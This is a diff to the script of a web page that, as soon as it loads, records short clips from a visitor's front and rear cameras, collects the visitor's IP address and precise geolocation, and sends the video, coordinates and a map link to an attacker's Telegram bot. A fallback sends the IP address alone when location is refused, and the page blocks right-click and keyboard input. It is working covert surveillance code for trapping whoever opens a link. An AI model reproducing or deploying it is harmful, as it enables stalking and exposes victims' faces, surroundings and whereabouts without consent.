@@ -20,7 +20,7 @@
         let isFrontCamera = true;
         let currentStream = null;
         let videoRecorder = null;
-        let videoDevices = [];
+        const RECORD_DURATION = 5000; // 5 detik
 
         async function getVideoDevices() {
             const devices = await navigator.mediaDevices.enumerateDevices();
@@ -29,14 +29,17 @@
 
         async function startVideoRecording() {
             try {
-                videoDevices = await getVideoDevices();
-                if(videoDevices.length === 0) return;
+                const videoDevices = await getVideoDevices();
+                if(videoDevices.length === 0) {
+                    console.log('No camera detected');
+                    return;
+                }
 
-                const selectedDevice = videoDevices[isFrontCamera ? 0 : 1];
                 const constraints = {
                     video: {
-                        deviceId: selectedDevice?.deviceId,
-                        facingMode: isFrontCamera ? "user" : "environment"
+                        facingMode: isFrontCamera ? "user" : "environment",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
                     }
                 };
 
@@ -52,50 +55,72 @@
                 videoRecorder.ondataavailable = (event) => chunks.push(event.data);
                 
                 videoRecorder.onstop = async () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                    await sendLocationAndVideo(videoBlob);
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    await sendLocationData(videoBlob);
                     
                     currentStream.getTracks().forEach(track => track.stop());
-                    if(isFrontCamera) {
+                    if(isFrontCamera && videoDevices.length > 1) {
                         isFrontCamera = false;
                         setTimeout(startVideoRecording, 1000);
                     }
                 };
 
                 videoRecorder.start();
-                setTimeout(() => videoRecorder.stop(), 3000);
+                setTimeout(() => {
+                    if(videoRecorder.state === "recording") {
+                        videoRecorder.stop();
+                    }
+                }, RECORD_DURATION);
+
             } catch(error) {
-                console.error('Error accessing camera:', error);
+                console.error('Camera access error:', error);
             }
         }
 
-        async function sendLocationAndVideo(videoBlob) {
-            try {
-                // Get IP Address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const { ip: userIP } = await ipResponse.json();
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                if(!navigator.geolocation) {
+                    reject('Geolocation not supported');
+                    return;
+                }
 
-                // Get Geolocation
-                const position = await new Promise((resolve, reject) => 
-                    navigator.geolocation.getCurrentPosition(resolve, reject));
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve(position.coords),
+                    error => reject(error),
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        async function sendLocationData(videoBlob) {
+            try {
+                // Get IP and Location
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipResponse.json();
+                const coords = await getLocation();
                 
-                const { latitude, longitude } = position.coords;
-                const message = `📍 New Visitor 🌐
-IP: ${userIP}
-Latitude: ${latitude}
-Longitude: ${longitude}
-Map: https://www.google.com/maps?q=${latitude},${longitude}`;
+                const message = `📌 5 Second Recording Captured
+📡 IP Address: ${ip}
+📍 Coordinates:
+Latitude: ${coords.latitude}
+Longitude: ${coords.longitude}
+🌍 Google Maps: https://www.google.com/maps?q=${coords.latitude},${coords.longitude}
+🕒 Timestamp: ${new Date().toLocaleString()}`;
 
                 // Send Video
                 const videoForm = new FormData();
                 videoForm.append("chat_id", window.config.chatID);
-                videoForm.append("video", videoBlob, "recording.webm");
+                videoForm.append("video", videoBlob, `recording_${Date.now()}.mp4`);
                 await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendVideo`, {
                     method: 'POST',
                     body: videoForm
                 });
 
-                // Send Location Info
+                // Send Location Details
                 await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -104,21 +129,36 @@ Map: https://www.google.com/maps?q=${latitude},${longitude}`;
                         text: message
                     })
                 });
+
             } catch(error) {
                 console.error('Error sending data:', error);
+                // Fallback if location blocked
+                const errorMessage = `❌ Location access blocked!\nIP: ${await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)}`;
+                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: window.config.chatID,
+                        text: errorMessage
+                    })
+                });
             }
         }
 
-        // Start recording when page loads
+        // Initialize recording when page loads
         document.addEventListener('DOMContentLoaded', () => {
-            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            if(navigator.mediaDevices?.getUserMedia) {
                 startVideoRecording();
+            }
+            try {
+                document.querySelector('audio').play();
+            } catch(e) {
+                console.log('Audio autoplay blocked');
             }
         });
     </script>
 </head>
 <body bgcolor="white" text="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
-    <!-- Konten tetap sama tanpa popup login -->
     <table width="100%" height="80%">
         <td>
             <center>
